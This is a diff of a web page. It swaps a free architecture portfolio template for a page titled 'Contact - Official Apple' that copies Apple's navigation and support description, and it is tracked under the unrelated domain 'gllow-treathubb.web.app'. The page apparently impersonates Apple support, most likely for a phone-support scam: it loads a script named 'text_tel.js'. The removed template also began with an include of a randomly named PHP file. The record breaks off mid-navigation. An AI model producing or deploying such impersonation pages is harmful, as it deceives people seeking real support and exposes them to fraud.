@@ -1,12 +1,8 @@
-<?php require __DIR__ . '/1czbpxh.php' ?>
-<!DOCTYPE html>
-<html class="no-js" lang="en">
-
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-	<!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+      <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5036824,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5036817,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,776 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5036824&101" alt="counter customizable free hit" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5036817&101" alt="hit tracker" border="0"></a></noscript>
 <!-- Histats.com  END  -->
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Y4P7Z94B0G"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-	<title>Archi - Free Architecture Portfolio HTML Template</title>
-	<meta charset="utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="format-detection" content="telephone=no">
-	<meta name="apple-mobile-web-app-capable" content="yes">
-	<meta name="author" content="TemplatesJungle">
-	<meta name="keywords" content="Free HTML Template">
-	<meta name="description" content="Free HTML Template">
+  gtag('config', 'G-Y4P7Z94B0G');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-	<link rel="stylesheet" type="text/css" href="icomoon/icomoon.css">
-	<link rel="stylesheet" type="text/css" href="css/vendor.css">
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
-		integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
-	<link rel="stylesheet" type="text/css" href="style.css">
-
-	<link rel="preconnect" href="https://fonts.googleapis.com">
-	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-	<link
-		href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&family=Roboto:ital,wght@0,400;0,700;1,400;1,700&display=swap"
-		rel="stylesheet">
 </head>
 
 <body>
-
-	<div class="preloader"></div>
-
-	<div class="nav nav-overlay">
-		<div class="nav__content">
-			<div class="container">
-				<div class="row p-4 p-md-0 flex-column-reverse flex-md-row g-md-5 nav__block">
-					<div class="col-md-5">
-						<ul class="nav__list d-none d-md-block">
-							<li class="nav__list-item active-nav"><a href="index.html" class="hover-target">Home</a>
-							</li>
-							<li class="nav__list-item"><a href="index.html" class="hover-target">Onepage</a></li>
-							<li class="nav__list-item"><a href="index.html" class="hover-target">Styles</a></li>
-							<li class="nav__list-item"><a href="index.html" class="hover-target">Blog</a></li>
-							<li class="nav__list-item"><a href="single-post.html" class="hover-target">Single Post</a>
-							</li>
-							<li class="nav__list-item"><a href="contact.html" class="hover-target">Contact us</a></li>
-						</ul>
-					</div>
-					<div class="col-md-4 text-white">
-						<h3 class="text-white fw-bold nav__block-item">Contact info</h3>
-						<p class="text-light nav__block-item">Officia nisi corrupti eaque cumque exercitationem labore
-							sint sapiente rem neque temporibus id ratione perspiciatis, tenetur est repellendus
-							aspernatur culpa repudiandae omnis.</p>
-						<ul class="list-unstyled text-light nav__block-item">
-							<li class="menu-item">
-								<i class="icon icon-location me-2"></i>2489 Locust Court, Los Angeles
-							</li>
-							<li class="menu-item">
-								<i class="icon icon-location2 me-2"></i>3927 Red Maple Drive, Los Angeles
-							</li>
-							<li class="menu-item">
-								<i class="icon icon-phone me-2"></i>+63 667 341 3463
-							</li>
-							<li class="menu-item">
-								<i class="icon icon-envelope-o me-2"></i><a href="#"
-									class="text-white">contact@example.com</a>
-							</li>
-						</ul>
-					</div>
-					<div class="col-md-3 text-white">
-						<h3 class="text-white fw-bold nav__block-item">Pages</h3>
-						<ul class="list-unstyled nav__block-item">
-							<li><a href="index.html" class="text-white">Onepage </a></li>
-							<li><a href="index.html" class="text-white">Styles </a></li>
-							<li><a href="index.html" class="text-white">Blog </a></li>
-							<li><a href="index.html" class="text-white">Single Post </a></li>
-							<li><a href="index.html" class="text-white">Contact us </a></li>
-							<li><a href="index.html" class="text-white">Portfolio Masonry </a></li>
-							<li><a href="index.html" class="text-white">Portfolio Grid </a></li>
-							<li><a href="index.html" class="text-white">Portfolio Grid </a></li>
-							<li><a href="index.html" class="text-white">Portfolio Grid </a></li>
-							<li><a href="index.html" class="text-white">Single Portfolio </a></li>
-							<li><a href="index.html" class="text-white">About Us </a></li>
-							<li><a href="index.html" class="text-white">Our Team </a></li>
-						</ul>
-					</div>
-				</div>
-			</div>
-
-		</div>
-	</div>
-
-	<div class="main-logo">
-		<a href="index.html">A.</a>
-	</div>
-
-	<div class="side-nav-bar">
-		<input id="menu-toggle" type="checkbox" />
-		<label class="menu-btn" for="menu-toggle">
-			<span></span>
-		</label>
-	</div>
-
-	<section id="intro" class="scrollspy-section">
-		<div class="main-slider">
-			<div class="slider-item jarallax" data-speed="0.2">
-				<img src="images/main-banner1.jpg" alt="banner" class="jarallax-img">
-				<div class="banner-content">
-					<h2 class="banner-title txt-fx">Modern Designs</h2>
-					<div class="btn-wrap">
-						<a href="#" class="btn-with-line">View Project</a>
-					</div>
-				</div><!--banner-content-->
-			</div><!--slider-item-->
-
-			<div class="slider-item jarallax" data-speed="0.2">
-				<img src="images/main-banner2.jpg" alt="banner" class="jarallax-img">
-				<div class="banner-content">
-					<h2 class="banner-title txt-fx">Clean & Minimal</h2>
-					<div class="btn-wrap">
-						<a href="#" class="btn-with-line">View Project</a>
-					</div>
-				</div><!--banner-content-->
-			</div><!--slider-item-->
-
-			<div class="slider-item jarallax" data-speed="0.2">
-				<img src="images/main-banner3.jpg" alt="banner" class="jarallax-img">
-				<div class="banner-content">
-					<h2 class="banner-title txt-fx">Personalize and Customize</h2>
-					<div class="btn-wrap">
-						<a href="#" class="btn-with-line">View Project</a>
-					</div>
-				</div><!--banner-content-->
-			</div><!--slider-item-->
-		</div><!--slider-->
-
-		<div class="button-container">
-			<button class="prev slick-arrow">
-				<i class="icon icon-chevron-thin-left"></i>
-			</button>
-			<button class="next slick-arrow">
-				<i class="icon icon-chevron-thin-right"></i>
-			</button>
-		</div>
-	</section>
-
-	<section id="about" class="scrollspy-section padding-xlarge">
-		<div class="container">
-			<div class="row">
-
-				<div class="col-md-12">
-
-					<div class="section-header">
-						<div class="title">
-							<span>who are we</span>
-						</div>
-						<h2 class="section-title">About Us</h2>
-					</div>
-				</div>
-
-			</div>
-
-			<div class="row">
-
-				<div class="col-md-6">
-					<figure class="jarallax-keep-img">
-						<img src="images/singleimage.jpg" alt="about us" class="jarallax-img single-image">
-					</figure>
-				</div>
-				<div class="col-md-6 description text-lead">
-					<p><strong>Amet, consectetur adipiscing elit. Commodo viverra eu volutpat amet, leo ultrici non
-							senectus odio dolor. Id at urna non porttitor elentum. Viverra senectus lorem ipsum dolor
-							sit adui ultricies dolor varius nibh velit viverra euen.</strong></p>
-					<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Commodo viverra eu volutpat amet, leo
-						non senetus odio dolor. Id at urna non portitor etum. Vivera senectus elit dui ultricies dolor.
-						Varius nibh velit pellentesque sapien, sapien neque dignissim.</p>
-					<p>Commodo vivera eu volutpat amet, leo non senectus odio dolor. Id at urna non porttitor elementum.
-						Viverra senectus dui ultricies dolor.</p>
-
-					<div class="btn-wrap">
-						<a href="#" class="btn btn-accent btn-xlarge btn-rounded">View my portfolio</a>
-					</div>
-
-				</div>
-
-			</div>
-
-		</div>
-	</section>
-
-	<section id="portfolio" class="scrollspy-section bg-dark padding-large">
-		<div class="container">
-
-			<div class="row">
-				<div class="col-md-12">
-
-					<div class="section-header">
-						<div class="title">
-							<span>Some of Our Works</span>
-						</div>
-						<h2 class="section-title light">Our Portfolio</h2>
-					</div>
-				</div>
-			</div>
-
-			<div class="row">
-
-				<div id="filters" class="button-group d-flex flex-wrap gap-4 py-5" data-aos="fade-up">
-					<a href="#" class="btn btn-outline-light rounded-pill text-uppercase is-checked"
-						data-filter=".design">Design</a>
-					<a href="#" class="btn btn-outline-light rounded-pill text-uppercase"
-						data-filter=".interior">Interior</a>
-					<a href="#" class="btn btn-outline-light rounded-pill text-uppercase"
-						data-filter=".landscape">Landscape</a>
-					<a href="#" class="btn btn-outline-light rounded-pill text-uppercase"
-						data-filter=".construction">Construction</a>
-				</div>
-
-			</div>
-
-			<div class="grid p-0 clearfix row row-cols-2 row-cols-lg-3 row-cols-xl-3" data-aos="fade-up">
-				<div class="col mb-4 portfolio-item construction interior">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 1."><img src="images/portfolio-thumb-1.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item construction construction">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 2."><img src="images/portfolio-thumb-2.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item construction">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 3."><img src="images/portfolio-thumb-11.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item construction">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 4."><img src="images/portfolio-thumb-4.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item interior">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 5."><img src="images/portfolio-thumb-5.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item design">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 6."><img src="images/portfolio-thumb-6.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item design">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 7."><img src="images/portfolio-thumb-7.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item design">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 8."><img src="images/portfolio-thumb-8.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item design">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 9."><img src="images/portfolio-thumb-9.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item design">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item1 0."><img src="images/portfolio-thumb-10.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item design">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item1 1."><img src="images/portfolio-thumb-11.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item construction">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item1 2."><img src="images/portfolio-thumb-2.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item interior">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 1."><img src="images/portfolio-thumb-3.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item landscape">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 2."><img src="images/portfolio-thumb-8.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item landscape">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 3."><img src="images/portfolio-thumb-1.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item interior">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 4."><img src="images/portfolio-thumb-4.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item interior">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 5."><img src="images/portfolio-thumb-5.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item interior">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 6."><img src="images/portfolio-thumb-6.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item landscape">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 7."><img src="images/portfolio-thumb-7.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item landscape">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item 8."><img src="images/portfolio-thumb-8.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item landscape">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item1 0."><img src="images/portfolio-thumb-10.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item construction">
-					<a href="images/portfolio-large-1.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item1 1."><img src="images/portfolio-thumb-11.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-				<div class="col mb-4 portfolio-item landscape">
-					<a href="images/portfolio-large-2.jpg" class="image-link"
-						title="Sample Caption goes here for Portfolio Item1 2."><img src="images/portfolio-thumb-1.jpg"
-							class="img-fluid" alt="portfolio"></a>
-				</div>
-			</div>
-
-		</div>
-	</section>
-
-	<section id="services" class="scrollspy-section padding-large">
-		<div class="container">
-			<div class="row">
-				<div class="section-header col-12">
-					<div class="title">
-						<span>what we do</span>
-					</div>
-					<h2 class="section-title">Services</h2>
-				</div>
-
-			</div>
-
-			<div class="row">
-
-				<div class="col-md-4">
-					<div class="services-item">
-						<span class="number">01</span>
-						<h3>Architecture Portfolio</h3>
-						<p>Lectus molestie id enim ipsum. Netus sed cursus nibh iaculis ipsum turpis nulla blandit dui.
-						</p>
-					</div>
-				</div>
-
-				<div class="col-md-4">
-					<div class="services-item">
-						<span class="number">02</span>
-						<h3>Planning Process</h3>
-						<p>Lectus molestie id enim ipsum. Netus sed cursus nibh iaculis ipsum turpis nulla blandit dui.
-						</p>
-					</div>
-
-				</div>
-
-				<div class="col-md-4">
-					<div class="services-item">
-						<span class="number">03</span>
-						<h3>Unique Design</h3>
-						<p>Lectus molestie id enim ipsum. Netus sed cursus nibh iaculis ipsum turpis nulla blandit dui.
-						</p>
-					</div>
-				</div>
-
-			</div>
-
-		</div>
-	</section>
-
-	<section id="subscribe" class="scrollspy-section padding-small">
-		<div class="container">
-			<div class="row">
-				<div class="col-md-6">
-					<figure class="subscribe-image">
-						<img src="images/subscribe-image.png" alt="subscribe">
-					</figure>
-				</div>
-				<div class="col-md-6">
-					<div class="subscribe-content">
-						<h2 class="section-title">subscribe us</h2>
-						<p>Join our newsletter to stay updated with super discounts and amazing offers. 300+ have
-							already subscribed us.</p>
-						<form id="form">
-							<input type="text" name="email" placeholder="enter your email address">
-							<button class="btn btn-accent btn-rounded btn-full btn-xlarge">Subscribe</button>
-						</form>
-					</div>
-				</div>
-			</div>
-		</div>
-	</section>
-
-	<section id="latest-blog" class="scrollspy-section bg-grey padding-large">
-		<div class="container">
-
-			<div class="row">
-
-				<div class="col">
-
-					<div class="section-header">
-						<div class="title">
-							<span>read our blog</span>
-						</div>
-						<h2 class="section-title">latest blog</h2>
-					</div>
-				</div>
-
-			</div>
-
-			<div class="row">
-				<div class="col-md-12">
-
-					<div class="post-grid">
-						<div class="row">
-
-							<div class="col-md-4">
-
-								<article class="post-item">
-
-									<figure>
-										<a href="#" class="image-hvr-effect">
-											<img src="images/postimg1.jpg" alt="post" class="post-image">
-										</a>
-									</figure>
-
-									<div class="post-content">
-										<div class="meta-date">Mar 30, 2021</div>
-										<h3 class="post-title"><a href="#">modern vibes bedrooms, todays trending
-												design</a></h3>
-										<p>Lectus molestie id enim ipsum. Netus sed cursus nibh iaculis ipsum turpis
-											nulla blandit dui.</p>
-									</div>
-								</article>
-
-							</div>
-
-							<div class="col-md-4">
-
-								<article class="post-item">
-									<figure>
-										<a href="#" class="image-hvr-effect">
-											<img src="images/postimg2.jpg" alt="post" class="post-image">
-										</a>
-									</figure>
-									<div class="post-content">
-										<div class="meta-date">Mar 29, 2021</div>
-										<h3 class="post-title"><a href="#">How to make minimalist living rooms
-												pop-out</a></h3>
-										<p>Lectus molestie id enim ipsum. Netus sed cursus nibh iaculis ipsum turpis
-											nulla blandit dui.</p>
-									</div>
-								</article>
-							</div>
-
-							<div class="col-md-4">
-								<article class="post-item">
-									<figure>
-										<a href="#" class="image-hvr-effect">
-											<img src="images/postimg3.jpg" alt="post" class="post-image">
-										</a>
-									</figure>
-									<div class="post-content">
-										<div class="meta-date">Mar 27, 2021</div>
-										<h3 class="post-title"><a href="#">how to make your resort that looks
-												outstanding</a></h3>
-										<p>Lectus molestie id enim ipsum. Netus sed cursus nibh iaculis ipsum turpis
-											nulla blandit dui.</p>
-									</div>
-								</article>
-							</div>
-
-						</div>
-					</div>
-
-				</div>
-
-
-
-			</div>
-
-			<div class="row">
-				<div class="col">
-
-					<div class="btn-wrap align-center">
-						<a href="#" class="btn btn-xlarge btn-accent btn-rounded">View all blog</a>
-					</div>
-
-				</div>
-			</div>
-
-		</div>
-	</section>
-
-	<section id="contact" class="scrollspy-section bg-dark padding-large">
-		<div class="container">
-
-			<div class="row">
-				<div class="col-md-6">
-
-					<div class="left-content">
-
-						<div class="section-header">
-							<div class="title">
-								<span>Get in touch</span>
-							</div>
-							<h2 class="section-title light">Contact us</h2>
-						</div>
-
-						<p>If you have any question about our process or company? Let us know how we can help you.</p>
-
-						<form id="form-contact" class="form-light" action="contact.php">
-							<p>
-								<input type="text" name="name" placeholder="Your Full Name*" required>
-							</p>
-							<p>
-								<input type="text" name="email" placeholder="Your Email Address" required>
-							</p>
-							<p>
-								<textarea name="message" placeholder="Your Message" required></textarea>
-							</p>
-							<p>
-								<label for="agree">
-									<input id="agree" name="agree" type="checkbox" required></input>
-									<span>I agree to privacy policy</span>
-								</label>
-							</p>
-							<button class="btn btn-accent btn-rounded btn-xlarge btn-full">Submit</button>
-						</form>
-
-
-					</div>
-
-				</div><!--left-content-->
-
-				<div class="col-md-6">
-					<div class="right-content">
-
-						<div class="iconbox">
-							<i class="icon icon-location"></i>
-							<div class="detail">
-								<strong>Address 1:</strong>
-								<p>3927 Red Maple Drive, Los Angeles</p>
-							</div>
-						</div>
-						<div class="iconbox">
-							<i class="icon icon-location2"></i>
-							<div class="detail">
-								<strong>Address 2:</strong>
-								<p>2489 Locust Court, Los Angeles</p>
-							</div>
-						</div>
-						<div class="iconbox">
-							<i class="icon icon-phone"></i>
-							<div class="detail">
-								<strong>Phone:</strong>
-								<p>+63 667 341 3463</p>
-							</div>
-						</div>
-						<div class="iconbox">
-							<i class="icon icon-mail3"></i>
-							<div class="detail">
-								<strong>Email:</strong>
-								<p><a href="#">contact@example.com</a></p>
-							</div>
-						</div>
-
-					</div>
-				</div><!--right-content-->
-
-			</div>
-
-		</div>
-	</section>
-
-	<section id="testimonial" class="padding-large">
-		<div class="container">
-
-			<div class="row">
-
-				<div class="col-md-6">
-
-					<figure class="jarallax-keep-img testimonial-image" data-speed="0.5">
-						<img src="images/review-bg.jpg" alt="review" class="jarallax-img">
-					</figure>
-
-				</div>
-
-				<div class="col-md-6">
-
-					<div class="testimonial-block">
-						<div class="section-header">
-							<div class="title">
-								<span>What clients says</span>
-							</div>
-							<h2 class="section-title">Testimonials</h2>
-						</div>
-						<div class="testimonials-inner">
-							<q>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Placerat venenatis tempor,
-								turpis dolor. Aliquam faucibus velit, volutpat vulputate risus urna enim.</q>
-							<div class="testimonial-author">
-								<div class="author-detail">
-									<div class="name">Lucifer</div>
-									<div class="author-title">CEO, unity real state</div>
-								</div>
-							</div>
-						</div>
-					</div><!--reviews-content-->
-
-				</div>
-			</div><!--grid-->
-
-		</div>
-	</section>
-
-	<footer id="footer">
-		<div class="container">
-			<div class="row">
-
-				<div class="col-md-3">
-
-					<div class="footer-menu menu-item-01">
-						<img src="images/logo.png" alt="logo" class="footer-logo">
-						<p>Tristique lacus ullamcorper massa posuere nisl molestie. Nullam motes, tortor masa. Nisl
-							tellus etiam.</p>
-						<div class="social-links">
-							<ul>
-								<li>
-									<a href="#"><i class="icon icon-facebook"></i></a>
-								</li>
-								<li>
-									<a href="#"><i class="icon icon-twitter"></i></a>
-								</li>
-								<li>
-									<a href="#"><i class="icon icon-youtube-play"></i></a>
-								</li>
-								<li>
-									<a href="#"><i class="icon icon-behance-square"></i></a>
-								</li>
-							</ul>
-						</div>
-					</div>
-
-				</div>
-
-				<div class="col-md-2">
-
-					<div class="footer-menu menu-item-02">
-						<h5>quick links</h5>
-						<ul class="menu-list">
-							<li class="menu-item">
-								<a href="#">home</a>
-							</li>
-							<li class="menu-item">
-								<a href="#">about us </a>
-							</li>
-							<li class="menu-item">
-								<a href="#">services</a>
-							</li>
-							<li class="menu-item">
-								<a href="#">portfolios</a>
-							</li>
-							<li class="menu-item">
-								<a href="#">blogs</a>
-							</li>
-							<li class="menu-item">
-								<a href="#">contact us</a>
-							</li>
-						</ul>
-					</div>
-
-				</div>
-
-				<div class="col-md-4">
-
-					<div class="footer-menu menu-item-03">
-						<h5>contact info</h5>
-						<ul class="menu-list">
-							<li class="menu-item">
-								<i class="icon icon-location"></i>2489 Locust Court, Los Angeles
-							</li>
-							<li class="menu-item">
-								<i class="icon icon-location2"></i>3927 Red Maple Drive, Los Angeles
-							</li>
-							<li class="menu-item">
-								<i class="icon icon-phone"></i>+63 667 341 3463
-							</li>
-							<li class="menu-item">
-								<i class="icon icon-envelope-o"></i><a href="#" class="mail-id">contact@example.com</a>
-							</li>
-						</ul>
-					</div>
-
-				</div>
-
-				<div class="col-md-3">
-
-					<div class="footer-menu menu-item-04">
-						<h5>gallery</h5>
-						<div class="gallery">
-							<a href="images/spacejoy.jpg" data-lightbox-gallery="gallery1"
-								title="Calm Before The Storm (One Shoe Photography Ltd.)" class="image-link"><img
-									src="images/tab1.jpg" alt="house" class="gallery-image"></a>
-							<a href="images/interior.jpg" data-lightbox-gallery="gallery1"
-								title="Grasmere Lake (Phil 'the link' Whittaker (gizto29))" class="image-link"><img
-									src="images/tab2.jpg" alt="house" class="gallery-image"></a>
-							<a href="images/interior.jpg" data-lightbox-gallery="gallery1"
-								title="Grasmere Lake (Phil 'the link' Whittaker (gizto29))" class="image-link"><img
-									src="images/tab3.jpg" alt="house" class="gallery-image"></a>
-							<a href="images/interior.jpg" data-lightbox-gallery="gallery1"
-								title="Grasmere Lake (Phil 'the link' Whittaker (gizto29))" class="image-link"><img
-									src="images/postimg1.jpg" alt="house" class="gallery-image"></a>
-							<a href="images/interior.jpg" data-lightbox-gallery="gallery1"
-								title="Grasmere Lake (Phil 'the link' Whittaker (gizto29))" class="image-link"><img
-									src="images/postimg2.jpg" alt="house" class="gallery-image"></a>
-							<a href="images/interior.jpg" data-lightbox-gallery="gallery1"
-								title="Grasmere Lake (Phil 'the link' Whittaker (gizto29))" class="image-link"><img
-									src="images/postimg3.jpg" alt="house" class="gallery-image"></a>
-						</div>
-					</div>
-
-				</div>
-
-			</div>
-		</div>
-	</footer>
-
-	<div id="footer-bottom">
-		<div class="container">
-			<div class="row">
-				<div class="col-md-6">
-					<div class="copyright">
-						<p>© 2022 Archi. All rights reserved.</p>
-					</div>
-				</div>
-				<div class="col-md-6">
-					<div class="copyright text-right">
-						<p>HTML Template by <a href="https://www.templatesjungle.com/"
-								target="_blank">TemplatesJungle</a> distributed By <a href="https://themewagon.com" target="blank">ThemeWagon</a> </p>
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-
-	<script src="js/jquery-1.11.0.min.js"></script>
-	<script src="js/ui-easing.js"></script>
-	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
-		integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
-		crossorigin="anonymous"></script>
-	<script src="https://unpkg.com/isotope-layout@3/dist/isotope.pkgd.min.js"></script>
-	<script src="js/plugins.js"></script>
-	<script src="js/script.js"></script>
-
-</body>
-
-</html>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
